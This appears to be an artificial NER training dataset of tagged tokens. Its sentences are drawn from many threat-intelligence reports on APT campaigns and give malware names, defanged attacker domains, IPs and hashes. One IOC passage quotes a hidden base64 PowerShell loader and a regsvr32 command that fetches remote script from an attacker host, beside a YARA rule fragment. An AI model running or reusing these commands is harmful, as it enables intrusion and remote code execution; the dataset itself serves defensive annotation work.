without	O
actually	O
allowing	O
it	O
to	O
connect	O
to	O
the	O
c2	O
server	O
)	O
.	O

From	O
the	O
email	O
it	O
looks	O
like	O
the	O
goal	O
of	O
the	O
attackers	O
was	O
to	O
infect	O
,	O
take	O
control	O
of	O
the	O
systems	O
of	O
users	O
associated	O
with	O
Mazagon	O
Dock	O
Shipbuilders	O
Limited	O
(	O
MDL	O
)	O
and	O
to	O
steal	O
sensitive	O
information	O
(	O
like	O
Product	O
design	O
documents	O
,	O
blueprints	O
,	O
manufacturing	O
processes	O
etc	O
)	O
related	O
to	O
warships	O
and	O
submarines	O
.	O

Use	O
of	O
this	O
information	O
constitutes	O
acceptance	O
for	O
use	O
in	O
an	O
'	O
as	O
is	O
'	O
condition	O
.	O

•	O
Uptime	O
7	O
.	O

A	O
summary	O
of	O
the	O
traffic	O
by	O
port	O
and	O
conversation	O
size	O
(	O
click	O
image	O
to	O
enlarge	O
)	O
:	O
The	O
infected	O
VM	O
talks	O
to	O
the	O
remote	O
host	O
on	O
the	O
following	O
five	O
TCP	O
ports	O
:	O

Tweet	O
.	O

Actually	O
,	O
we	O
see	O
an	O
obvious	O
overlap	O
of	O
targets	O
between	O
the	O
two	O
,	O
with	O
subtle	O
differences	O
which	O
closely	O
account	O
for	O
the	O
geopolitical	O
changes	O
in	O
the	O
region	O
that	O
happened	O
during	O
the	O
last	O
two	O
years.Interestingly	O
,	O
some	O
of	O
the	O
spear-phishing	O
documents	O
between	O
Cloud	B-malware.unknown
Atlas	I-malware.unknown
and	O
RedOctober	B-malware.unknown
seem	O
to	O
exploit	O
the	O
same	O
theme	O
and	O
were	O
used	O
to	O
target	O
the	O
same	O
entity	O
at	O
different	O
times	O
.	O

KSN	O
visibility	O
and	O
detections	O
suggests	O
a	O
shift	O
from	O
their	O
early	O
2017	O
high	O
volume	O
NATO	O
spearphish	O
targeting	O
towards	O
the	O
middle	O
east	O
and	O
Central	O
Asia	O
,	O
and	O
finally	O
moving	O
their	O
focus	O
further	O
east	O
into	O
late	O
2017	O
.	O

According	O
to	O
Shodan	O
,	O
the	O
port	O
(	O
1234	O
)	O
has	O
been	O
spotted	O
open	O
since	O
12-07-2016	O
which	O
is	O
25	O
days	O
before	O
the	O
first	O
discovery	O
.	O

Most	O
of	O
the	O
activity	O
associated	O
with	O
publicly	O
available	O
RATs	B-malware.backdoor
is	O
traditional	O
cybercrime	O
associated	O
with	O
spam	O
runs	O
,	O
banking	O
Trojans	B-malware.backdoor
and	O
malware	O
distribution	O
.	O

Cyber	O
Espionage	O
is	O
a	O
critical	O
issue	O
.	O

components	O
of	O
this	O
malware	O
system	O
.	O

To	O
add	O
stealth	O
to	O
its	O
backdoor	O
routines	B-malware.backdoor
,	O
it	O
uses	O
a	O
legitimate	O
process	O
context	O
's	O
memory	O
space	O
to	O
inject	O
the	O
main	O
backdoor	O
.	O

?	O
1	O
]	O
]	O
**0	O
!	O

Web	O
.	O

Exploit	O
Document	O
MD5	O
:	O

Editors	O
of	O
Ukrainian	O
newspapers	O
.	O

While	O
investigating	O
some	O
of	O
the	O
smaller	O
name	O
servers	O
that	O
APT28/Sofacy	O
routinely	O
use	O
to	O
host	O
their	O
infrastructure	O
,	O
Cylance	O
discovered	O
another	O
prolonged	O
campaign	O
that	O
appeared	O
to	O
exclusively	O
target	O
Japanese	O
companies	O
and	O
individuals	O
that	O
began	O
around	O
August	O
2016	O
.	O

'	O
word.crabdance.com	B-url.unknown
'	O
previously	O
resolved	O
to	O
'	O
64.71.162.70	B-ip.unknown
'	O
on	O
September	O
8	O
,	O
2012	O
and	O
108.171.246.140	B-ip.unknown
on	O
February	O
19	O
,	O
2014	O
.	O

The	O
hard	O
coded	O
IP	O
address	O
91[.]205[.]173[.]3	B-ip.unknown
in	O
the	O
binary	O
from	O
where	O
the	O
malware	O
downloads	O
additional	O
components	O
is	O
also	O
associated	O
with	O
the	O
same	O
hosting	O
provider	O
in	O
Germany	O
as	O
shown	O
below	O
.	O

As	O
part	O
of	O
the	O
attacker	O
's	O
development	O
and	O
testing	O
it	O
appears	O
that	O
they	O
compromised	O
their	O
device	O
—	O
we	O
observed	O
a	O
device	O
named	O
'	O
test	O
'	O
or	O
'	O
mdmdev	O
.	O
'	O

The	O
embedded	O
configuration	O
contains	O
nothing	O
more	O
than	O
a	O
URL	O
that	O
Cmstar	O
uses	O
as	O
its	O
command	O
and	O
control	O
(	O
C2	O
)	O
location	O
.	O

The	O
current	O
version	O
is	O
Xtreme	O
3.6	O
,	O
however	O
,	O
there	O
are	O
a	O
variety	O
of	O
'	O
private	O
'	O
version	O
of	O
this	O
RAT	O
available	O
as	O
well	O
.	O

All	O
of	O
the	O
attacks	O
we	O
have	O
observed	O
occurred	O
through	O
document	O
exploits	O
attacking	O
known	O
vulnerabilities	O
.	O

For	O
more	O
in-depth	O
coverage	O
,	O
including	O
full	O
details	O
of	O
the	O
analysis	O
behind	O
this	O
blog	O
as	O
well	O
as	O
additional	O
indicators	O
which	O
can	O
be	O
used	O
to	O
detect	O
similar	O
samples	O
,	O
or	O
if	O
you	O
have	O
any	O
other	O
queries	O
,	O
please	O
give	O
us	O
a	O
shout	O
at	O
threatintelligence@uk.pwc.com	B-url.normal
.	O

Figure	O
10	O

It	O
is	O
suspected	O
that	O
this	O
was	O
a	O
formerly	O
active	O
exploit	O
URL	O
.	O

Cloning	O
the	O
ZxShell	B-malware.backdoor
Server	O

What	O
has	O
changed	O
is	O
the	O
hashing	O
algorithm	O
.	O

To	O
deal	O
with	O
these	O
type	O
of	O
threats	O
,	O
employ	O
solutions	O
that	O
include	O
network	O
monitoring	O
to	O
detect	O
and	O
analyze	O
incoming	O
threats	O
,	O
as	O
well	O
as	O
any	O
outgoing	O
communication	O
with	O
attacking	O
parties	O
.	O

Port	O
80	O
and	O
443	O
are	O
the	O
default	O
ports	O
for	O
HTTP	O
and	O
HTTPS	O
traffic	O
.	O

The	O
following	O
table	O
summarizes	O
the	O
list	O
of	O
hostnames	O
used	O
by	O
the	O
attacker	O
(	O
s	O
)	O
:	O

iOSApplications	O
329e025866bc6e88184af0b633eb3334b2e8b1c0817437c03fcd922987c5cf04	O
AppsSLoader.ipa	O
aef046b67871076d507019cd87afdaeef602d1d2924b434ec1c165097b781242	O
MyApp.ipa	O
4be31095e5f010cc71cf8961f8fe3fc3ed27f8d8788124888a1e90cb90b2bef1	O
PrayTime.ipa	O
624689a1fd67891be1399811d6008524a506e7e0b262f549f5aa16a119369aef	O
Telegram.ipa	O
e3872bb33d8a4629846539eb859340940d14fdcf5b1c002b57c7dfe2adf52f08	O
Wplus.ipa	O
MDM	B-malware.infosteal
Domains	O
:	O
ios-certificate-update[.]com	B-url.unknown
www[.]wpitcher[.]com	B-url.unknown
C2	O
Domains	O
:	O
Voguextra[.]com	B-url.unknown
Techwach[.]com	B-url.unknown
Advertising	O
Domain	O
:	O
voguextra[.]com	B-url.unknown

During	O
reverse	O
engineering	O
of	O
the	O
RAT	B-malware.backdoor
Installer	O
we	O
observed	O
that	O
the	O
file	O
implemented	O
an	O
anti-behavioral	O
analysis	O
technique	O
.	O

Squarcini	O
confirmed	O
to	O
Mediapart	O
that	O
the	O
government	O
of	O
Kazakhstan	O
is	O
a	O
client	O
,	O
but	O
Arcanum	O
spokeswoman	O
Yael	O
Hartmann	O
denied	O
that	O
the	O
company	O
was	O
responsible	O
for	O
the	O
spearphishing	O
attempts	O
,	O
insisting	O
that	O
the	O
company	O
has	O
complied	O
with	O
Swiss	O
law	O
.	O

What	O
is	O
not	O
clear	O
is	O
why	O
specific	O
resources	O
(	O
web-based	O
exploits	O
)	O
appear	O
to	O
be	O
shared	O
,	O
and	O
why	O
others	O
(	O
primarily	O
malware	O
families	O
)	O
are	O
sometimes	O
kept	O
within	O
a	O
specific	O
cluster	O
.	O

All	O
certificates	O
are	O
issued	O
with	O
a	O
serial	O
number	O
which	O
normally	O
is	O
quite	O
unique	O
,	O
as	O
it	O
is	O
supposed	O
to	O
be	O
an	O
identifier	O
within	O
the	O
scope	O
of	O
its	O
issuer	O
.	O

APT32	B-malware.infosteal
appears	O
to	O
have	O
a	O
well-resourced	O
development	O
capability	O
and	O
uses	O
a	O
custom	O
suite	O
of	O
backdoors	O
spanning	O
multiple	O
protocols	O
.	O

It	O
then	O
launches	O
the	O
executable	O
(	O
SQLite.exe	O
)	O
with	O
the	O
command	O
line	O
arguments	O
as	O
shown	O
in	O
the	O
below	O
screen	O
shots	O
.	O

Command	O
and	O
Control	O
server	O
5	O
.	O

'	O
Nachalo	O
'	O
(	O
'	O
start	O
communication	O
session	O
'	O
)	O
,	O
with	O
a	O
3	O
second	O
delay	O
between	O
each	O
attempt	O
to	O
connect	O
to	O
the	O
C	O
&	O
C	O
.	O

For	O
more	O
information	O
,	O
visit	O
https://www.dhs.gov/ais	B-url.normal
.	O

log.exe	O

But	O
now	O
let	O
's	O
have	O
a	O
look	O
at	O
what	O
the	O
botnet	B-malware.ransom
really	O
is	O
.	O

Record	O
#	O
1	O
Length	O
:	O
78247	O
bytes	O
:	O

The	O
project	O
implements	O
a	O
remote	O
library	O
injection	O
technique	O
called	O
'	O
Reflective	O
DLL	O
Injection	O
'	O
.	O

The	O
G	O
DATA	O
experts	O
alerted	O
the	O
aeCERT	O
about	O
the	O
incident	O
and	O
their	O
analysis	O
results	O
.	O

According	O
to	O
a	O
former	O
IRGC	O
cyber	O
commander	O
,	O
the	O
Khaybar	O
Center	O
was	O
established	O
in	O
2011	O
and	O
has	O
been	O
linked	O
to	O
a	O
number	O
of	O
attacks	O
against	O
the	O
United	O
States	O
,	O
Saudi	O
Arabia	O
,	O
and	O
Turkey	O
.	O

EvilGrab	B-malware.drop
steals	O
user	O
credentials	O
related	O
to	O
the	O
following	O
applications	O
and/or	O
protocols	O
:	O
•	O
HTTP	O
HTTPMail	O
IMAP	O
Internet	O
Explorer	O
(	O
IE	O
)	O
Microsoft	O
Outlook	O
•	O
POP3	O
•	O
Protected	O
Storage	O
•	O
SMTP	O
Windows	O
Messaging	O
EvilGrab	B-malware.drop
steals	O
these	O
credentials	O
by	O
parsing	O
the	O
following	O
registry	O
keys	O
:	O
It	O
queries	O
the	O
above	O
keys	O
for	O
related	O
values	O
that	O
correspond	O
to	O
the	O
applications	O
and	O
protocols	O
listed	O
earlier	O
.	O

WADA	O
declares	O
the	O
Russian	O
Anti-Doping	O
Agency	O
(	O
RUSADA	O
)	O
noncompliant	O
.	O

Most	O
of	O
these	O
appear	O
to	O
have	O
been	O
recovered	O
.	O

If	O
you	O
or	O
your	O
organization	O
is	O
interested	O
in	O
obtaining	O
crowd-sourced	O
threat	O
intelligence	O
that	O
increases	O
your	O
awareness	O
of	O
emerging	O
cyber	O
threats	O
,	O
please	O
register	O
at	O
ThreatConnect.com	B-url.normal
and	O
join	O
our	O
community	O
.	O

Users	O
of	O
the	O
site	O
are	O
redirected	O
using	O
malicious	O
iFrame	O
and	O
profiled	O
Exploitation	O
of	O
previously	O
known	O
vulnerabilities	O
present	O
on	O
unpatched	O
systems	O
.	O

626576e5f0f85d77c460a322a92bb267	O

Function	O
DecryptCommandBuffer_sub_44C628	O
(	O
)	O

This	O
sample	O
contains	O
most	O
of	O
the	O
important	O
strings	O
encrypted	O
.	O

While	O
recent	O
Zebrocy	B-malware.backdoor
versioning	O
was	O
7.1	O
,	O
some	O
of	O
the	O
related	O
Zebrocy	B-malware.backdoor
modules	I-malware.backdoor
that	O
drop	O
file-stealing	O
MSIL	O
modules	O
we	O
call	O
Covfacy	B-malware.backdoor
were	O
v7.0	O
.	O

For	O
reference	O
,	O
we	O
've	O
overlaid	O
our	O
ScanBox	B-malware.infosteal
clusters	O
against	O
the	O
likely	O
clusters	O
Symantec	O
created	O
behind	O
the	O
scenes	O
for	O
their	O
blog	O
,	O
as	O
well	O
as	O
other	O
popular	O
names	O
:	O

Attackers	O
in	O
this	O
case	O
made	O
every	O
attempt	O
to	O
launch	O
a	O
clever	O
attack	O
campaign	O
by	O
spoofing	O
legitimate	O
email	O
ids	O
and	O
using	O
an	O
email	O
theme	O
relevant	O
to	O
the	O
targets	O
.	O

The	O
text	O
refers	O
to	O
a	O
video	O
of	O
Sheikh	O
Adnan	O
al-Arour—a	O
Sunni	O
pro-opposition	O
cleric—based	O
in	O
Saudi	O
Arabia	O
,	O
calling	O
for	O
holy	O
war	O
against	O
Assad	O
and	O
Hezbollah	O
.	O

The	O
administrative	O
commands	O
consist	O
of	O
the	O
following	O
five	O
commands	O
:	O

The	O
U.S.	O
Democratic	O
party	O
's	O
governing	O
body	O
,	O
the	O
Democratic	O
National	O
Committee	O
(	O
DNC	O
)	O
,	O
uses	O
the	O
dnc.org	O
domain	O
for	O
its	O
staff	O
email	O
.	O

a921aa35deedf09fabee767824fd8f7e	B-hash

4e	O
38	O
1f	O
a7	O
7f	O
08	O
cc	O
aa	O
0d	O
56	O
ed	O
ef	O
f9	O
ed	O
08	O

Computer	O
Info	O
Collector	O
:	O
Collects	O
data	O
about	O
the	O
client	O
such	O
as	O
Windows	O
OS	O
version	O
,	O
computer	O
name	O
,	O
user	O
name	O
,	O
IP	O
address	O
,	O
MAC	O
address	O
,	O
antivirus	O
software	O
,	O
etc	O
.	O

We	O
elaborate	O
on	O
the	O
scope	O
and	O
targeting	O
of	O
the	O
DustySky	B-malware.drop
campaign	O
and	O
expose	O
new	O
infrastructure	O
and	O
incidents	O
.	O

When	O
the	O
batch	O
file	O
is	O
executed	O
,	O
a	O
Windows	O
executable	O
file	O
(	O
a	O
downloader	O
)	O
and	O
a	O
dummy	O
file	O
for	O
display	O
will	O
be	O
downloaded	O
from	O
a	O
C	O
&	O
C	O
server	O
,	O
saved	O
in	O
%	O
TEMP	O
%	O
folder	O
and	O
then	O
executed	O
.	O

However	O
,	O
it	O
relied	O
on	O
automatic	O
attack	O
testing	O
platform	O
instead	O
of	O
abilities	O
of	O
the	O
attack	O
team	O
.	O

For	O
file	O
encryption	O
,	O
the	O
malware	O
uses	O
the	O
AES-128	O
and	O
RSA-2048	O
algorithms	O
.	O

Time	O
Allocation	O
Vacancy	O
Report	O
china	O
paper	O
table	O
and	O
graph	O
results	O
with	O
zeros	O
–	O
some	O
ready	O
not	O
all	O
finished	O
Macron	O
Leaks	O
contain	O
secret	O
plans	O
for	O
the	O
islamisation	O
of	O
France	O
and	O
Europe	O
Macron_Authenticity.doc.rtf	O
Macron_Information.doc.rtf	O
US	O
and	O
EU	O
Trade	O
with	O
China	O
and	O
China	O
CA.xlsm	O
Tables	O
457	O
Appendix	O
with	O
zeros.xlsm	O
Project	O
Codes	O
-	O
05.30.17.xlsm	O
Weekly	O
Vacancy	O
Status	O
Report	O
5-30-15.xlsm	O
Macron_Tax_Evasion.doc.rtf	O
Macron_secret_plans.doc.rtf	O
lyncdiscover.2bunny[.]com	B-url.unknown
autodiscover.2bunny[.]com	B-url.unknown
lyncdiscover.2bunny[.]com:443/Autodiscover/AutodiscoverService/	B-url.unknown
lyncdiscover.2bunny[.]com/Autodiscover	B-url.unknown
autodiscover.2bunny[.]com/K5om	B-url.unknown
sfo02s01-in-f2.cloudsend[.]net/submit.php	B-url.unknown
sfo02s01-in-f2.cloudsend[.]net/IE9CompatViewList.xml	B-url.unknown
tk-in-f156.2bunny[.]com	B-url.unknown
tk-in-f156.2bunny[.]com/Agreement.doc	B-url.unknown
104.236.77[.]169	B-ip.unknown
138.68.45[.]9	B-ip.unknown
162.243.143[.]145	B-ip.unknown
Mozilla/5.0	O
(	O
compatible	O
;	O
MSIE	O
9.0	O
;	O
Windows	O
NT	O
6.1	O
;	O
Trident/5.0	O
;	O
FunWebProducts	O
;	O
IE0006_ver1	O
;	O
EN_GB	O
)	O
tf-in-f167.2bunny[.]com:443	O
(	O
*Only	O
seen	O
in	O
VT	O
not	O
ITW	O
)	O
RTF	O
MD5	O
hash	O
values	O
0bef39d0e10b1edfe77617f494d733a8	B-hash
0e6da59f10e1c4685bb5b35a30fc8fb6	B-hash
cebd0e9e05749665d893e78c452607e2	B-hash
XLSX	O
MD5	O
hash	O
values	O
38125a991efc6ab02f7134db0ebe21b6	B-hash
3a1dca21bfe72368f2dd46eb4d9b48c4	B-hash
30f149479c02b741e897cdb9ecd22da7	B-hash
BEACON	O
and	O
Meterpreter	O
payload	O
MD5	O
hash	O
values	O
bae0b39197a1ac9e24bdf9a9483b18ea	B-hash
1151619d06a461456b310096db6bc548	B-hash
Process	O
arguments	O
,	O
named	O
pipes	O
,	O
and	O
file	O
paths	O
powershell.exe	O
-NoP	O
-NonI	O
-W	O
Hidden	O
-Command	O
'	O
Invoke-Expression	O
$	O
(	O
New-Object	O
IO.StreamReader	O
(	O
$	O
(	O
New-Object	O
IO.Compression.DeflateStream	O
(	O
$	O
(	O
New-Object	O
IO.MemoryStream	O
(	O
,	O
$	O
(	O
[	O
Convert	O
]	O
:	O
:FromBase64String	O
(	O
'	O
<	O
base64	O
blob	O
>	O
'	O
)	O
regsvr32.exe	O
/s	O
/n	O
/u	O
/i	O
:	O
hxxps://lyncdiscover.2bunny.com/Autodiscover	O
scrobj.dll	O
\\	O
<	O
ip	O
>	O
\pipe\msagent_	O
<	O
4	O
digits	O
>	O
C	O
:	O
\Documents	O
and	O
Settings\	O
<	O
user	O
>	O
\Local	O
Settings\Temp\K5om.dll	O
(	O
4	O
character	O
DLL	O
based	O
on	O
URI	O
of	O
original	O
GET	O
request	O
)	O
rule	O
FE_LEGALSTRIKE_MACRO	O
{	O
meta:version='.1	O
'	O
filetype='MACRO	O
'	O
author='Ian.Ahl@fireeye.com	O
@	O
TekDefense	O
'	O
date='2017-06-02	O
'	O
description='This	O
rule	O
is	O
designed	O
to	O
identify	O
macros	O
with	O
the	O
specific	O
encoding	O
used	O
in	O
the	O
sample	O
30f149479c02b741e897cdb9ecd22da7	O
.	O
'	O

regards	O
Mary	O
Alidu	O
Swift	O
Admin	O
,	O
Kurdsitan	O
Int'l	O
Bank	O
For	O
Inv	O
And	O
Dev	O
KIB	O
.	O

C	O
&	O
C	O
protocol	O
Installation	O
and	O
Deployment	O

Encryption	O
key	O
using	O
blowfish	O

'	O
@	O
JoeUchill	O
within	O
a	O
few	O
days	O
will	O
be	O
new	O
attack	O
on	O
the	O
WADA/Olimpic	O
.	O
'	O

Whenever	O
it	O
is	O
run	O
,	O
the	O
Windows	O
shell	O
(	O
)	O
loads	O
a	O
component	O
of	O
the	O
fax	O
server	O
in	O
Windows	O
,	O
.	O

Based	O
on	O
the	O
volume	O
of	O
activity	O
observed	O
during	O
our	O
research	O
,	O
we	O
assess	O
the	O
CSRI	O
may	O
be	O
engaged	O
in	O
supporting	O
the	O
malicious	O
disinformation	O
activities	O
of	O
Ravand	O
Cybertech	O
.	O

안다리엘	O
그룹은	O
이	O
악성코드를	O
2015년	O
부터	O
2016년	O
사이에	O
전개한	O
공격에	O
사용했으며	O
,	O
일부는	O
한국어판을	O
제작해	O
사용하기도	O
했다	O
.	O

Analysis	O
efforts	O
did	O
not	O
have	O
access	O
to	O
'	O
command	O
'	O
files	O
retrieved	O
from	O
the	O
victim	O
systems	O
for	O
either	O
the	O
headquarters	O
or	O
the	O
field	O
unit	O
applications	O
.	O

Interesting	O
artifacts	O
and	O
observations	O
continue	O
to	O
be	O
discovered	O
and	O
made	O
,	O
such	O
as	O
the	O
malware	O
's	O
apparent	O
expiration	O
,	O
the	O
interesting	O
naming	O
convention	O
for	O
a	O
directory	O
to	O
hold	O
collected	O
data	O
,	O
and	O
the	O
actors	O
'	O
apparent	O
intention	O
to	O
avoid	O
certain	O
networks	O
or	O
network	O
addressing	O
schemes	O
.	O

modulo	O
EDI	O
(	O
at	O
instruction	O
0x0044C767	O
)	O
to	O
choose	O
which	O
byte	O
of	O
the	O
key	O
to	O
use	O
on	O
the	O
k	O

ybersecurity	O
experts	O
are	O
increasingly	O
concerned	O
about	O
the	O
threat	O
posed	O
by	O
Russian	O
hacking	O
groups	O
.	O

By	O
using	O
it	O
,	O
one	O
must	O
either	O
recover	O
the	O
randomly	O
generated	O
key	O
or	O
crack	O
the	O
RSA	O
encryption	O
to	O
analyze	O
subsequent	O
layers	O
of	O
the	O
attack	O
.	O

Run	O
the	O
Cleanup	O
member	O
function	O
of	O
each	O
of	O
the	O
registered	O
derived	O
objects	O
,	O
effectively	O
resetting	O
the	O
state	O
of	O
each	O
of	O
the	O
modules	O
.	O

The	O
JRat	B-malware.backdoor
JAR	O
file	O
contains	O
an	O
encrypted	O
config	O
file	O
named	O
The	O
JRat	B-malware.backdoor
config	O
file	O
is	O
encrypted	O
using	O
AES	O
in	O
CBC	O
mode	O
.	O

IPS	O
:	O
network-based	O
protection	O

The	O
main	O
component	O
in	O
question	O
stores	O
its	O
strings	O
and	O
configuration	O
in	O
an	O
unencrypted	O
form	O
.	O

PowerShell	O
Obfuscator	O
–	O
All	O
the	O
new	O
PowerShell	O
payloads	O
are	O
obfuscated	O
using	O
a	O
publicly	O
available	O
script	O
adapted	O
from	O
a	O
Daniel	O
Bohannon	O
's	O
GitHub	O
project	O
.	O

But	O
typos	O
are	O
not	O
the	O
only	O
English	O
mistakes	O
of	O
this	O
APT	O
group	O
.	O

This	O
threat	O
analysis	O
provides	O
security	O
operations	O
center	O
(	O
SOC	O
)	O
analysts	O
and	O
engineers	O
with	O
detailed	O
information	O
pertaining	O
to	O
the	O
workings	O
of	O
the	O
Elise	B-malware.backdoor
malware	O
family	O
and	O
the	O
indicators	O
of	O
compromise	O
(	O
IoCs	O
)	O
to	O
assist	O
them	O
in	O
their	O
own	O
independent	O
analyses	O
.	O

Le	O
Monde	O
.	O

Malicious	O
Domain	O
/	O
IP	O
:	O
support.chatconnecting(.)com	B-url.cncsvr

When	O
loaded	O
into	O
memory	O
via	O
a	O
LoadLibrary	O
or	O
equivalent	O
function	O
call	O
,	O
the	O
server	O
variant	O
will	O
determine	O
the	O
name	O
of	O
the	O
host	O
binary	O
(	O
presumably	O
svchost.exe	O
)	O
as	O
well	O
as	O
its	O
own	O
DLL	O
's	O
name	O
.	O

NewCT	B-malware.backdoor
RAT	I-malware.backdoor
evolved	O
from	O
older	O
versions	O
called	O
'	O
CT	B-malware.backdoor
'	O
,	O
which	O
has	O
been	O
observed	O
being	O
used	O
in	O
association	O
with	O
the	O
'	O
Nflog	B-malware.backdoor
'	O
Backdoor	O
.	O

We	O
've	O
chosen	O
to	O
refer	O
to	O
the	O
malware	O
as	O
'	O
DownExecute	B-malware.infosteal
'	O
due	O
to	O
the	O
.pdb	O
string	O
left	O
in	O
the	O
malware	O
(	O
leaving	O
debug	O
paths	O
in	O
malware	O
seems	O
to	O
be	O
very	O
fashionable	O
at	O
the	O
moment	O
...	O
)	O
:	O
All	O
variants	O
of	O
the	O
DownExecute	B-malware.infosteal
'	O
malware	O
we	O
've	O
identified	O
come	O
packaged	O
in	O
the	O
following	O
fashion	O
:	O
From	O
the	O
samples	O
we	O
have	O
analysed	O
so	O
far	O
,	O
the	O
decoy	O
application	O
included	O
is	O
never	O
used	O
by	O
the	O
binary	O
,	O
and	O
is	O
presumably	O
included	O
so	O
that	O
anyone	O
taking	O
a	O
cursory	O
look	O
at	O
the	O
file	O
will	O
conclude	O
it	O
is	O
in	O
fact	O
the	O
real	O
deal	O
.	O

To	O
detect	O
whether	O
the	O
malware	O
is	O
running	O
in	O
a	O
virtual	O
machine	O
,	O
the	O
malware	O
author	O
checks	O
if	O
the	O
following	O
directories	O
and	O
the	O
one	O
file	O
exist	O
:	O
C	O
:	O
\Program	O
Files\VMWare\VMware	O
Tools\	O
C	O
:	O
\Program	O
Files	O
(	O
x86	O
)	O
\VMware\WMware	O
Tools\	O
C:\WINDOWS\system32\VBoxtray.exe	O
Furthermore	O
,	O
the	O
malware	O
checks	O
if	O
following	O
applications	O
analysts	O
usually	O
use	O
are	O
being	O
executed	O
:	O
Wireshark	O
:	O
a	O
network	O
analyzer	O
Fiddler	O
:	O
a	O
web	O
proxy	O
used	O
to	O
debug	O
HTTP	O
flow	O
.	O

Network	O
IOCs	O
and	O
Infrastructure	O
Overlap	O

The	O
first	O
seemed	O
to	O
focus	O
on	O
military	O
,	O
diplomatic	O
,	O
and	O
media	O
targets	O
,	O
and	O
relied	O
on	O
the	O
cover	O
of	O
proxies	O
and	O
private	O
domain	O
registrations	O
.	O

5	O
.	O

Modified	O
Time	O
Stamp	O
:	O
2018-01-09	O
04:25:00	O
(	O
Jan	O
.	O

If	O
the	O
downloader	O
determines	O
another	O
instance	O
of	O
itself	O
is	O
running	O
,	O
the	O
code	O
writes	O
the	O
string	O
'	O
CM**	B-malware.unknown
'	O
–	O
which	O
happens	O
to	O
be	O
the	O
basis	O
for	O
the	O
name	O
of	O
the	O
Trojan	B-malware.backdoor
–	O
to	O
the	O
log	O
file	O
.	O

China	O

VirusTotal	O
shows	O
a	O
number	O
of	O
links	O
to	O
malicious	O
executables	O
on	O
this	O
domain	O
.	O

The	O
second	O
part	O
of	O
the	O
campaign	O
(	O
from	O
Feb	O
.	O

The	O
exploit	O
has	O
previously	O
been	O
used	O
by	O
several	O
exploit	O
kits	O
including	O
RIG	O
and	O
Angler	O
to	O
deliver	O
multiple	O
crimeware	O
tools	O
.	O

?	O
1	O
?	O
0	O
8d	O
44	O
24	O
?	O
c	O
66	O
8b	O
10	O
66	O
3b	O
11	O
75	O
1e	O
66	O
85	O
d2	O
74	O
15	O
66	O
8b	O
50	O
02	O
66	O
3b	O
51	O
02	O
75	O
0f	O
83	O
c0	O
04	O
83	O
c1	O
04	O
66	O
85	O
d2	O
75	O
de	O
33	O
c0	O
eb	O
05	O
1b	O
c0	O
83	O
d8	O
ff	O
85	O
c0	O
0f	O
84	O
?	O
?	O

We	O
accept	O
Bitcoin	O
,	O
you	O
can	O
find	O
exchangers	O
on	O
https://www.bitcoin.com/buy-bitcoin	B-url.normal
and	O
others	O
.	O

We	O
can	O
list	O
the	O
configuration	O
's	O
content	O
with	O
Dino	B-malware.backdoor
's	O
'	O
conf	O
–l	O
CORE	O
'	O
command	O
–	O
described	O
later	O
–	O
which	O
displays	O
on	O
separate	O
rows	O
each	O
key	O
's	O
name	O
,	O
its	O
associated	O
value	O
and	O
the	O
type	O
of	O
this	O
value	O
:	O

4	O
.	O

The	O
verbosity	O
of	O
the	O
error	O
messages	O
makes	O
it	O
particularly	O
easy	O
to	O
understand	O
the	O
purpose	O
of	O
the	O
code	O
.	O

case	O
'	O
e	O
'	O
:	O

Each	O
of	O
these	O
macro-based	O
documents	O
used	O
similar	O
techniques	O
for	O
code	O
execution	O
,	O
persistence	O
and	O
communication	O
with	O
the	O
command	O
and	O
control	O
(	O
C2	O
)	O
server	O
.	O

The	O
command	O
index	O
table	O
and	O
command	O
handler	O
address	O
table	O
.	O

PDF	O
document	O
contained	O
in	O
the	O
EXE	O
file	O
1F1E9958440D773C34415D9EB6334B25	B-hash
Found	O
in	O
Palestine	O

For	O
active	O
servers	O
that	O
have	O
not	O
been	O
publicly	O
revealed	O
,	O
we	O
list	O
the	O
first	O
two	O
octets	O
only	O
.	O

Examples	O
of	O
this	O
refactoring	O
include	O
for	O
instance	O
the	O
switch	O
from	O
using	O
the	O
Pugi-XML	O
library	O
to	O
using	O
Microsoft	O
's	O
MSXML	O
3.0	O
for	O
XML-related	O
functionality	O
.	O

RIPTIDE	O
's	O
first	O
communication	O
with	O
its	O
C2	O
server	O
fetches	O
an	O
encryption	O
key	O
,	O
and	O
the	O
RC4	O
encryption	O
key	O
is	O
used	O
to	O
encrypt	O
all	O
further	O
communication	O
.	O

Zebrocy	O
custom	O
crypto	O

13	O
Sept	O
.	O

The	O
remaining	O
part	O
of	O
this	O
post	O
is	O
organized	O
as	O
follows	O
.	O

The	O
initial	O
Trojan	O
dropper	O
is	O
a	O
Dynamic	O
Link	O
Library	O
functioning	O
as	O
a	O
loader	O
for	O
further	O
malware	O
.	O

The	O
version	O
value	O
is	O
hard­coded	O
in	O
the	O
ntshrui.DLL	O
file	O
in	O
the	O
samples	O
we	O
observed	O
.	O

The	O
'	O
reports-pdf.jar	B-malware.infosteal
'	O
malware	O
was	O
sent	O
in	O
a	O
phishing	O
email	O
that	O
contained	O
some	O
of	O
the	O
following	O
details	O
:	O

For	O
additional	O
information	O
,	O
please	O
see	O
our	O
blog	O
post	O
.	O

Frequently	O
,	O
a	O
remote	O
administration	B-malware.drop
tool	O
(	O
RAT	B-malware.drop
)	O
is	O
used	O
to	O
maintain	O
persistence	O
within	O
a	O
victim	O
's	O
organization	O
.	O

By	O
Jasper	O
Manuel	O
and	O
Rommel	O
Joven	O
|	O
July	O
08	O
,	O
2018	O
wo	O
weeks	O
ago	O
,	O
FortiGuard	O
Labs	O
spotted	O
a	O
malicious	O
document	O
with	O
the	O
politically	O
themed	O
file	O
name	O
'	O
Draft	O
PH-US	O
Dialogue	O
on	O
Cyber	O
Security.doc	O
'	O
.	O

injection	O

6/12	O

A	O
malware-infected	O
30.apk	B-malware.backdoor
application	O
probably	O
could	O
not	O
have	O
provided	O
all	O
the	O
necessary	O
data	O
required	O
to	O
directly	O
facilitate	O
the	O
types	O
of	O
tactical	O
strikes	O
that	O
occurred	O
between	O
July	O
and	O
August	O
2014	O
.	O

Yes	O
,	O
all	O
samples	O
are	O
detected	O
by	O
signatures	O
and	O
also	O
heuristics	O
.	O

The	O
malware	O
below	O
is	O
part	O
of	O
the	O
reconnaissance	O
stage	O
and	O
should	O
lead	O
to	O
the	O
main	O
course	O
,	O
whose	O
nature	O
is	O
still	O
unknown	O
.	O

2	O
.	O

The	O
above	O
process	O
,	O
when	O
carried	O
further	O
,	O
produces	O
many	O
more	O
social	O
links	O
.	O

If	O
the	O
process	O
is	O
not	O
found	O
,	O
however	O
,	O
the	O
will	O
